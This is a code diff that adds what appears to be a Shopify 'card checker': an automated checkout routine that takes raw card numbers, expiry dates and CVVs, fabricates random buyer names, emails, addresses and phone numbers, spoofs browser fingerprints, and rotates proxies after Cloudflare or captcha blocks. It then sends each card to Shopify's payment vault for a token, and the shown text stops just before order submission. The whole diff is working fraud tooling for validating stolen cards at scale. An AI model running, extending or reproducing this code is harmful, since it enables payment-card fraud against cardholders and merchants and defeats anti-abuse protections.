@@ -1054,9 +1054,942 @@ def parse_cc_string(cc_string):
         'cvv': cvv_match.group(0)
     }
 
-# ──────────────────────── Concurrency Engine ────────────────────────
+# ============================================================
+# _process_card_inner - Core checkout flow
+# ============================================================
+async def _process_card_inner(cc, mes, ano, cvv, ourl, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None):
+    gateway = "UNKNOWN"
+    total_price = "0.00"
+    currency = "USD"
+    payment_identifier = None
+    ourl = ourl.strip()
+    proxy = parse_proxy(proxy_str) if proxy_str else None
+    checkpoint_data = None
+    running_total = "0.00"
+    original_currency = "USD"
+    resp_json = {}
+    final_text = ""
 
-MAX_CONCURRENT = 50000
+    try:
+        _bp = _pick_browser_profile()
+        headers = _build_ordered_headers({
+            'Host': urlparse(ourl).netloc,
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': _pick_accept_language(),
+            'Accept-Encoding': _pick_accept_encoding(),
+            'Content-Type': 'application/json',
+            'Origin': ourl,
+            'Referer': ourl + '/',
+            'User-Agent': _bp['ua'],
+            'sec-ch-ua': _bp['sec_ch_ua'],
+            'sec-ch-ua-mobile': _bp['sec_ch_ua_mobile'],
+            'sec-ch-ua-platform': _bp['sec_ch_ua_platform'],
+            'Cache-Control': _pick_cache_control(),
+            'DNT': '1',
+        })
+
+        address_info = pick_addr(ourl)
+        country_code = address_info["countryCode"]
+        phone_raw = address_info.get("phone", "2125550000")
+        if country_code in ("US", "CA"):
+            phone = f"{phone_raw[:3]}-{phone_raw[3:6]}-{random.randint(1000, 9999)}"
+        elif country_code == "GB":
+            phone = f"+44 7700 {random.randint(900000, 999999)}"
+        elif country_code == "AU":
+            phone = f"+61 491 570 {random.randint(100, 999)}"
+        else:
+            phone = (phone_raw[:-4] + str(random.randint(1000, 9999))) if len(phone_raw) > 4 else (phone_raw + str(random.randint(1000, 9999)))
+
+        firstName, lastName = Utils.get_random_name()
+        email = Utils.generate_email(firstName, lastName)
+        street = address_info.get("address1", "123 Main St")
+        street = f"{street} Apt {random.randint(1, 999)}"
+        city = address_info.get("city", "New York")
+        state = address_info.get("zoneCode", "NY")
+        s_zip = address_info.get("postalCode", "10001")
+        address2 = random.choice([f"Apt {random.randint(1, 999)}", f"Suite {random.randint(100, 999)}", f"Unit {random.randint(1, 99)}", f"Room {random.randint(10, 99)}", f"Floor {random.randint(1, 5)}"])
+
+        _cached_requires_shipping = None
+        if not variant_id:
+            now = time.time()
+            cache_key = normalize_cache_key(ourl)
+            with _VARIANT_CACHE_LOCK:
+                cached = _VARIANT_CACHE.get(cache_key)
+            if cached:
+                _cache_ttl = cached[5] if len(cached) > 5 else 7200
+                if (now - cached[1]) < _cache_ttl:
+                    variant_id = cached[0]
+                    _cached_requires_shipping = cached[2] if len(cached) > 2 else None
+                    currency = cached[3] if len(cached) > 3 else "USD"
+                    logger.info(f"[CACHE] Hit: {cache_key} -> variant_id: {variant_id}")
+                else:
+                    with _VARIANT_CACHE_LOCK:
+                        _VARIANT_CACHE.pop(cache_key, None)
+            if not variant_id:
+                logger.info(f"[CACHE] Miss for {cache_key}. Fetching...")
+                info = await fetch_products(ourl, proxy_str, timeout_sec=min(20, timeout_sec))
+                if isinstance(info, tuple) and info[0] is False:
+                    err = info[1] if len(info) > 1 else "Failed to fetch products"
+                    return False, f"SITE_ERROR: {err}", gateway, total_price, currency
+                variant_id = info['variant_id']
+                _cached_requires_shipping = info.get('requires_shipping', True)
+                currency = info.get('currency', 'USD')
+                prune_variant_cache()
+
+        connector = get_global_connector()
+        timeout = aiohttp.ClientTimeout(total=timeout_sec, sock_read=min(15, timeout_sec))
+
+        async with AiohttpCurlCffiSession(connector=connector, connector_owner=False, timeout=timeout, browser_profile=_bp) as session:
+            url = ourl
+            cart = url + '/cart/add.js'
+            checkout = url + '/checkout/'
+
+            _session_is_fresh = False
+            if session.session is not None:
+                _session_is_fresh = not getattr(session.session, '_shopify_prewarmed', False)
+            if _session_is_fresh:
+                try:
+                    prewarm_headers = {
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                        'Accept-Language': _pick_accept_language(),
+                        'Accept-Encoding': _pick_accept_encoding(),
+                        'Cache-Control': _pick_cache_control(),
+                        'User-Agent': _bp['ua'],
+                        'sec-ch-ua': _bp['sec_ch_ua'],
+                        'sec-ch-ua-mobile': _bp['sec_ch_ua_mobile'],
+                        'sec-ch-ua-platform': _bp['sec_ch_ua_platform'],
+                        'Upgrade-Insecure-Requests': '1',
+                        'sec-fetch-dest': 'document',
+                        'sec-fetch-mode': 'navigate',
+                        'sec-fetch-site': 'none',
+                        'sec-fetch-user': '?1',
+                        'DNT': '1',
+                    }
+                    prewarm_resp = await session.get(url + '/', headers=prewarm_headers, proxy=proxy)
+                    prewarm_resp.close()
+                    await asyncio.sleep(random.uniform(0.5, 1.2))
+                    try:
+                        session.session._shopify_prewarmed = True
+                    except Exception:
+                        pass
+                except Exception:
+                    pass
+
+            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json, text/javascript', 'X-Requested-With': 'XMLHttpRequest'}
+            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
+            await cart_resp.read()
+            if cart_resp.status != 200:
+                cart_headers_alt = {**headers, 'Content-Type': 'application/json', 'Accept': 'application/json'}
+                cart_resp = await session.post(cart, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, headers=cart_headers_alt, proxy=proxy)
+                await cart_resp.read()
+
+            if cart_resp.status != 200:
+                try:
+                    text_lower = (await cart_resp.text()).lower()
+                except Exception:
+                    text_lower = ""
+                is_permanent = cart_resp.status in (404, 422) or any(w in text_lower for w in ["sold out", "not found", "unavailable", "exist"])
+                is_server_error = cart_resp.status >= 500
+                if is_permanent:
+                    cache_key = normalize_cache_key(ourl)
+                    with _VARIANT_CACHE_LOCK:
+                        _VARIANT_CACHE.pop(cache_key, None)
+                    if any(w in text_lower for w in ["sold out", "not found", "unavailable"]):
+                        logger.info(f"[CART] Variant sold out, fetching fresh...")
+                        fresh = await fetch_products(ourl, proxy_str, timeout_sec=min(15, timeout_sec))
+                        if isinstance(fresh, dict) and fresh.get('variant_id'):
+                            variant_id = fresh['variant_id']
+                            fresh_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
+                            await fresh_resp.read()
+                            if fresh_resp.status == 200:
+                                await asyncio.sleep(random.uniform(0.5, 1.2))
+                            else:
+                                return False, f"Cart failed (fresh variant also failed)", gateway, total_price, currency
+                        else:
+                            return False, "No valid products (all sold out?)", gateway, total_price, currency
+                if is_server_error:
+                    _record_proxy_fail(proxy)
+                    return False, f"Proxy Error: Cart server error {cart_resp.status}", gateway, total_price, currency
+                if cart_resp.status != 200:
+                    return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency
+
+            await asyncio.sleep(random.uniform(0.8, 1.8))
+
+            checkout_headers = {**headers, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Upgrade-Insecure-Requests': '1', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1'}
+            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+            checkout_url = str(response.url)
+
+            if 'shop.app' in checkout_url or 'shop-pay' in checkout_url or 'shoppay' in checkout_url:
+                return False, "Shop Pay redirection (site not supported)", gateway, total_price, currency
+
+            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
+            text = await response.text()
+            sst = extract_session_token(text, response.headers)
+
+            if 'login' in checkout_url.lower():
+                return False, "Site requires login!", gateway, total_price, currency
+
+            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
+            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
+            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or extract_between(text, 'ProductVariantMerchandise/', '&q') or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
+            if not merch:
+                merch = str(variant_id)
+
+            currency = 'USD'
+            if 'currencyCode&quot;:&quot;' in text:
+                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
+            elif '"currencyCode":"' in text:
+                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
+            original_currency = currency
+
+            site_cc = extract_between(text, 'countryCode&quot;:&quot;', '&quot;') or extract_between(text, '"countryCode":"', '"')
+            if not site_cc:
+                m = re.search(r'Shopify\.country\s*=\s*["\']([A-Z]{2})["\']', text)
+                if m:
+                    site_cc = m.group(1)
+            if site_cc and len(site_cc) == 2 and site_cc.upper() != country_code:
+                new_cc = site_cc.upper()
+                if new_cc in book:
+                    address_info = book[new_cc]
+                    country_code = address_info["countryCode"]
+                    phone = address_info.get("phone", "2125550000")
+                    if len(phone) > 4:
+                        phone = phone[:-4] + str(random.randint(1000, 9999))
+                    else:
+                        phone = phone + str(random.randint(1000, 9999))
+                    street = f"{address_info.get('address1', '123 Main St')} Apt {random.randint(1, 999)}"
+                    city = address_info.get("city", "New York")
+                    state = address_info.get("zoneCode", "NY")
+                    s_zip = address_info.get("postalCode", "10001")
+
+            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
+            if not subtotal:
+                m = re.search(r'"price":\s*"([\d.]+)"', text)
+                subtotal = m.group(1) if m else "0.01"
+
+            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
+            build_id = None
+            m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
+            if m:
+                build_id = m.group(1)
+
+            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
+            if source_token:
+                source_token = source_token.replace('&quot;', '').strip('"')
+
+            ident_sig = None
+            m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
+            if m:
+                ident_sig = m.group(1)
+
+            if not sst:
+                logger.warning(f"[SESSION TOKEN FAIL] status={response.status} url={checkout_url}")
+                await asyncio.sleep(random.uniform(0.3, 0.8))
+                try:
+                    retry_proxy = proxy
+                    fallbacks = _get_fallback_proxies(uid)
+                    if fallbacks:
+                        valid_fallbacks = [fb for fb in fallbacks if fb != proxy]
+                        retry_proxy = random.choice(valid_fallbacks) if valid_fallbacks else random.choice(fallbacks)
+                    cart_resp2 = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=retry_proxy)
+                    await cart_resp2.read()
+                    response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=retry_proxy)
+                    checkout_url = str(response.url)
+                    text = await response.text()
+                    sst = extract_session_token(text, response.headers)
+                    if sst:
+                        proxy = retry_proxy
+                except Exception as e:
+                    logger.error(f"[SESSION TOKEN RETRY] Failed: {e}")
+                if not sst:
+                    is_cf = is_cloudflare_blocked(text, response.status if response else None, response.headers if response else None)
+                    err_msg = "Proxy Error: Cloudflare block on checkout" if is_cf else "Proxy Error: Failed to get session token"
+                    _record_proxy_fail(proxy)
+                    return False, err_msg, gateway, total_price, currency
+
+            headers.update({'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{attempt_token}", type="cn"', 'x-checkout-one-session-token': sst, 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'})
+            if build_id:
+                headers['x-checkout-web-build-id'] = build_id
+                headers['x-checkout-web-deploy-stage'] = 'production'
+                headers['x-checkout-web-server-handling'] = 'fast'
+                headers['x-checkout-web-server-rendering'] = 'yes'
+            if source_token:
+                headers['x-checkout-web-source-id'] = source_token
+
+            params = {'operationName': 'Proposal'}
+            json_data = {
+                'query': QUERY_PROPOSAL_SHIPPING,
+                'variables': {
+                    'sessionInput': {'sessionToken': sst},
+                    'queueToken': queueToken or '',
+                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
+                    'delivery': {
+                        'deliveryLines': [{'destination': {'partialStreetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
+                        'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
+                    },
+                    'merchandise': {'merchandiseLines': [{'stableId': stableId or '1', 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{merch}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}}, 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}}, 'lineComponentsSource': None, 'lineComponents': []}]},
+                    'payment': {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': country_code, 'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
+                    'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': country_code}, 'email': email, 'emailChanged': False, 'phoneCountryCode': country_code, 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False},
+                    'tip': {'tipLines': []},
+                    'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
+                    'note': {'message': None, 'customAttributes': []},
+                    'localizationExtension': {'fields': []},
+                    'nonNegotiableTerms': None,
+                    'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
+                    'optionalDuties': {'buyerRefusesDuties': False}
+                },
+                'operationName': 'Proposal'
+            }
+
+            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
+            await asyncio.sleep(random.uniform(0.2, 0.6))
+
+            captcha_retries = 0
+            for i in range(8):
+                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy)
+                if not response:
+                    if i < 2:
+                        await asyncio.sleep(0.5 * (i + 1))
+                        continue
+                    break
+                if is_captcha_required(resp_text):
+                    captcha_retries += 1
+                    if captcha_retries > 2:
+                        _record_proxy_fail(proxy)
+                        return False, "Proxy Error: security check", gateway, total_price, currency
+                    new_proxy = _rotate_fallback_proxy(proxy)
+                    if new_proxy and new_proxy != proxy:
+                        proxy = new_proxy
+                        headers['Origin'] = ourl
+                    await asyncio.sleep(1.5)
+                    continue
+                try:
+                    resp_json = safe_json_loads(resp_text)
+                    if not resp_json:
+                        return False, "Invalid JSON response", gateway, total_price, currency
+                except Exception as e:
+                    return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency
+                if 'errors' in resp_json:
+                    errors = resp_json.get('errors', [])
+                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
+                    return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency
+                try:
+                    session_data = (resp_json.get('data') or {}).get('session') or {}
+                    result = (session_data.get('negotiate') or {}).get('result') or {} if session_data else {}
+                    result_type = result.get('__typename', '')
+                    if result_type == 'Throttled':
+                        queueToken = result.get('queueToken') or queueToken
+                        json_data['variables']['queueToken'] = queueToken
+                        if i < 7:
+                            await asyncio.sleep(float(result.get('pollAfter', 2.0)))
+                            continue
+                        else:
+                            return False, "Rate Limit (Throttled)", gateway, total_price, currency
+                except Exception:
+                    pass
+                try:
+                    seller_proposal = ((((resp_json.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}).get('sellerProposal') or {}
+                    is_shipping_required = seller_proposal.get('isShippingRequired', True)
+                    res_type = (seller_proposal.get('delivery') or {}).get('__typename')
+                    captcha_field = seller_proposal.get('captcha') or {}
+                    if captcha_field and captcha_field.get('__typename') == 'Captcha' and captcha_field.get('sitekey'):
+                        captcha_token = captcha_field.get('token')
+                        captcha_provider = captcha_field.get('provider', 'hcaptcha')
+                        if captcha_token:
+                            captcha_retries += 1
+                            if captcha_retries <= 2:
+                                json_data['variables']['captcha'] = {'provider': captcha_provider, 'token': captcha_token}
+                                await asyncio.sleep(0.5)
+                                continue
+                        captcha_retries += 1
+                        if captcha_retries <= 2:
+                            new_proxy = _rotate_fallback_proxy(proxy)
+                            if new_proxy and new_proxy != proxy:
+                                proxy = new_proxy
+                            await asyncio.sleep(2.0)
+                            json_data['variables'].pop('captcha', None)
+                            continue
+                        return False, "Proxy Error: hCaptcha", gateway, total_price, currency
+                    if not is_shipping_required or res_type == 'FilledDeliveryTerms':
+                        break
+                except Exception:
+                    pass
+                await asyncio.sleep(float(result.get('pollAfter', 0.15) if result_type == 'Throttled' else 0.15))
+
+            if not response:
+                _record_proxy_fail(proxy)
+                return False, f"Proxy Error: Request failed: {resp_text}", gateway, total_price, currency
+
+            try:
+                if 'data' not in resp_json:
+                    return False, "No data in proposal response", gateway, total_price, currency
+                session_data = resp_json['data'].get('session')
+                if session_data is None:
+                    return False, "Session is null", gateway, total_price, currency
+                negotiate = session_data.get('negotiate')
+                if negotiate is None:
+                    return False, "Negotiate returned null", gateway, total_price, currency
+                result = negotiate.get('result')
+                if result is None:
+                    return False, "Result is null", gateway, total_price, currency
+                result_type = result.get('__typename', 'Unknown')
+                if result_type == 'CheckpointDenied':
+                    return False, "Checkpoint Denied", gateway, total_price, currency
+                if result_type == 'NegotiationResultFailed':
+                    return False, "Negotiation failed", gateway, total_price, currency
+                if result.get('checkpointData'):
+                    checkpoint_data = result.get('checkpointData')
+                if result.get('queueToken'):
+                    queueToken = result.get('queueToken')
+                seller_proposal = result.get('sellerProposal')
+                if seller_proposal is None:
+                    return False, "Seller proposal is null", gateway, total_price, currency
+                delivery_data = seller_proposal.get('delivery')
+                running_total_data = seller_proposal.get('runningTotal')
+                if not running_total_data:
+                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
+                running_total = running_total_data['value']['amount']
+                if running_total_data['value'].get('currencyCode'):
+                    currency = running_total_data['value']['currencyCode']
+                    original_currency = currency
+                try:
+                    merch_data = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
+                    if merch_data and len(merch_data) > 0:
+                        merch_amt = merch_data[0].get('totalAmount', {}).get('value', {}).get('amount')
+                        if merch_amt is not None:
+                            subtotal = str(merch_amt)
+                except Exception:
+                    pass
+            except (KeyError, TypeError) as e:
+                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
+
+            is_shipping_required = seller_proposal.get('isShippingRequired', True)
+            if _cached_requires_shipping is False:
+                is_shipping_required = False
+            if not delivery_data:
+                return False, "No delivery data in proposal", gateway, total_price, currency
+            delivery_type = delivery_data.get('__typename', '')
+
+            pending_attempts = 0
+            while delivery_type == 'PendingTerms' and pending_attempts < MAX_PENDING_ATTEMPTS:
+                pending_attempts += 1
+                wait_time = min((delivery_data.get('pollDelay', 800) / 1000.0) * (1 + pending_attempts * 0.2), 3.0)
+                await asyncio.sleep(wait_time)
+                response, resp_text, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy)
+                if response:
+                    try:
+                        retry_json = safe_json_loads(resp_text)
+                        if retry_json:
+                            retry_seller = retry_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
+                            if retry_seller:
+                                delivery_data = retry_seller.get('delivery', delivery_data)
+                                running_total_data = retry_seller.get('runningTotal', running_total_data)
+                                if running_total_data and running_total_data.get('__typename') != 'PendingTerms':
+                                    if 'value' in running_total_data and 'amount' in running_total_data['value']:
+                                        running_total = running_total_data['value']['amount']
+                                seller_proposal = retry_seller
+                    except Exception:
+                        pass
+                delivery_type = delivery_data.get('__typename', '') if delivery_data else ''
+
+            if pending_attempts >= MAX_PENDING_ATTEMPTS:
+                return False, "PENDING_TIMEOUT", gateway, total_price, currency
+
+            has_delivery_lines = False
+            has_destination = True
+            if delivery_type == 'PendingTerms':
+                delivery_strategy = ''
+                shipping_amount_str = '0.00'
+                delivery_lines = delivery_data.get('deliveryLines', [])
+                if delivery_lines:
+                    has_delivery_lines = True
+                    if delivery_lines[0].get('destinationAddress') is None:
+                        has_destination = False
+            elif delivery_type == 'FilledDeliveryTerms':
+                delivery_lines = delivery_data.get('deliveryLines', [])
+                if delivery_lines:
+                    has_delivery_lines = True
+                    if delivery_lines[0].get('destinationAddress') is None:
+                        has_destination = False
+                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
+                    if available_strategies:
+                        try:
+                            available_strategies = sorted(available_strategies, key=lambda s: float(s.get('amount', {}).get('value', {}).get('amount', '0') or '999999'))
+                        except Exception:
+                            pass
+                        delivery_strategy = available_strategies[0].get('handle', '')
+                        shipping_amount_str = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+                    else:
+                        delivery_strategy = ''
+                        shipping_amount_str = '0.00'
+                else:
+                    delivery_strategy = ''
+                    shipping_amount_str = '0.00'
+            else:
+                delivery_strategy = ''
+                shipping_amount_str = '0.00'
+
+            try:
+                tax_data = seller_proposal.get('tax', {})
+                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
+                    tax_amount_str = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
+                    tax_amount = float(tax_amount_str)
+                else:
+                    tax_amount = 0.0
+                    tax_amount_str = '0.00'
+            except Exception:
+                tax_amount = 0.0
+                tax_amount_str = '0.00'
+
+            payment_data = seller_proposal.get('payment', {})
+            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
+                payment_methods = payment_data.get('availablePaymentLines', [])
+                for method in payment_methods:
+                    pm = method.get('paymentMethod', {})
+                    typename = pm.get('__typename', '')
+                    name = str(pm.get('name') or '').lower()
+                    if any(w in name for w in ['paypal', 'apple_pay', 'google_pay', 'shop_pay', 'cash_on_delivery', 'cod']):
+                        continue
+                    if typename == 'PaymentProvider' or (pm.get('brands') or pm.get('paymentBrands')):
+                        payment_identifier = pm.get('paymentMethodIdentifier')
+                        gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
+                        try:
+                            rate = EXCHANGE_RATES.get(currency.upper(), 1.0)
+                            if currency.upper() != "USD" and rate != 1.0:
+                                total_price = f"{format_price(round(float(running_total) * rate, 2), 'USD')} [Min Prod: {format_price(round(float(subtotal) * rate, 2), 'USD')} | Tax: {format_price(round(float(tax_amount_str) * rate, 2), 'USD')} | Ship: {format_price(round(float(shipping_amount_str) * rate, 2), 'USD')}]"
+                            else:
+                                total_price = f"{format_price(round(float(running_total), 2), currency)} [Min Prod: {format_price(subtotal, currency)} | Tax: {format_price(tax_amount_str, currency)} | Ship: {format_price(shipping_amount_str, currency)}]"
+                        except Exception:
+                            total_price = f"{format_price(running_total, currency)}"
+                        break
+                if not payment_identifier:
+                    for method in payment_methods:
+                        pm = method.get('paymentMethod', {})
+                        if pm.get('paymentMethodIdentifier'):
+                            payment_identifier = pm.get('paymentMethodIdentifier')
+                            gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
+                            total_price = f"{format_price(running_total, currency)}"
+                            break
+
+            if not payment_identifier:
+                return False, "No valid payment method found", gateway, total_price, currency
+
+            subtotal_str = subtotal
+            json_data['query'] = QUERY_PROPOSAL_DELIVERY
+            json_data['variables']['queueToken'] = queueToken or ''
+            if checkpoint_data:
+                json_data['variables']['checkpointData'] = checkpoint_data
+            else:
+                json_data['variables'].pop('checkpointData', None)
+            json_data['variables']['buyerIdentity']['customer']['presentmentCurrency'] = currency
+            json_data['variables']['taxes']['proposedTotalAmount']['value']['currencyCode'] = currency
+            if 'merchandiseLines' in json_data['variables']['merchandise'] and json_data['variables']['merchandise']['merchandiseLines']:
+                json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['currencyCode'] = currency
+                json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['amount'] = subtotal_str
+            if not is_shipping_required:
+                json_data['variables']['delivery']['deliveryLines'] = []
+                json_data['variables']['delivery']['noDeliveryRequired'] = [{'stableId': stableId or '1'}]
+            else:
+                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {'deliveryStrategyByHandle': {'handle': delivery_strategy if delivery_strategy else '', 'customDeliveryRate': False}, 'options': {}}
+                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId or '1'}]}
+                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'value': {'amount': shipping_amount_str, 'currencyCode': currency}}
+            json_data['variables']['payment']['billingAddress'] = {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
+            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
+            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
+
+            for attempt in range(4):
+                response, resp_text, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy)
+                if is_captcha_required(resp_text):
+                    new_proxy = _rotate_fallback_proxy(proxy)
+                    if new_proxy and new_proxy != proxy:
+                        proxy = new_proxy
+                        await asyncio.sleep(1.5)
+                        continue
+                    return False, "Proxy Error: security check on delivery", gateway, total_price, currency
+                try:
+                    second_resp_json = safe_json_loads(resp_text)
+                    if not second_resp_json:
+                        continue
+                    sec_res = (((second_resp_json.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}
+                    if sec_res.get('__typename') == 'Throttled':
+                        queueToken = sec_res.get('queueToken') or queueToken
+                        json_data['variables']['queueToken'] = queueToken
+                        await asyncio.sleep(float(sec_res.get('pollAfter', 0.2)))
+                        continue
+                    if sec_res.get('__typename') == 'NegotiationResultAvailable':
+                        if sec_res.get('checkpointData'):
+                            checkpoint_data = sec_res.get('checkpointData')
+                        if sec_res.get('queueToken'):
+                            queueToken = sec_res.get('queueToken')
+                        sec_seller = sec_res.get('sellerProposal') or {}
+                        sec_running = ((sec_seller.get('runningTotal') or {}).get('value') or {}).get('amount')
+                        if sec_running:
+                            running_total = str(sec_running)
+                        sec_tax = sec_seller.get('tax') or {}
+                        if sec_tax.get('__typename') == 'FilledTaxTerms':
+                            tax_amount_str = ((sec_tax.get('totalTaxAmount') or {}).get('value') or {}).get('amount', '0')
+                            tax_amount = float(tax_amount_str)
+                        sec_delivery = sec_seller.get('delivery') or {}
+                        if sec_delivery.get('__typename') == 'FilledDeliveryTerms':
+                            sec_lines = sec_delivery.get('deliveryLines') or [{}]
+                            if sec_lines:
+                                available_strategies = sec_lines[0].get('availableDeliveryStrategies') or []
+                                if available_strategies:
+                                    try:
+                                        available_strategies = sorted(available_strategies, key=lambda s: float(s.get('amount', {}).get('value', {}).get('amount', '0') or '999999'))
+                                    except Exception:
+                                        pass
+                                    delivery_strategy = available_strategies[0].get('handle', '')
+                                    shipping_amount_str = ((available_strategies[0].get('amount') or {}).get('value') or {}).get('amount', '0')
+                            break
+                except Exception:
+                    pass
+                if attempt < 3:
+                    await asyncio.sleep(0.2)
+
+            try:
+                total_price = f"{format_price(round(float(running_total), 2), currency)} [Min Prod: {format_price(subtotal, currency)} | Tax: {format_price(tax_amount_str, currency)} | Ship: {format_price(shipping_amount_str, currency)}]"
+            except Exception:
+                pass
+            if is_shipping_required and not delivery_strategy:
+                total_price = "0.00"
+
+            payload = {"credit_card": {"number": cc, "month": int(mes), "year": int(ano) if int(ano) > 100 else int(ano) + 2000, "verification_value": cvv, "start_month": None, "start_year": None, "issue_number": "", "name": f"{firstName} {lastName}"}, "payment_session_scope": urlparse(url).netloc}
+            vault_headers = {'Content-Type': 'application/json', 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://checkout.pci.shopifyinc.com', 'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-fetch-storage-access': 'active'}
+            if ident_sig:
+                vault_headers['shopify-identification-signature'] = ident_sig
+
+            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
+            try:
+                token_data = await response.json()
+                token = token_data.get('id')
+                if not token:
+                    return False, 'Proxy Error: Unable to get payment token', gateway, total_price, currency
+            except Exception as e:
+                try:
+                    await response.read()
+                except Exception:
+                    pass
+                return False, f'Proxy Error: Unable to get payment token: {str(e)}', gateway, total_price, currency
+
+            params = {'operationName': 'SubmitForCompletion'}
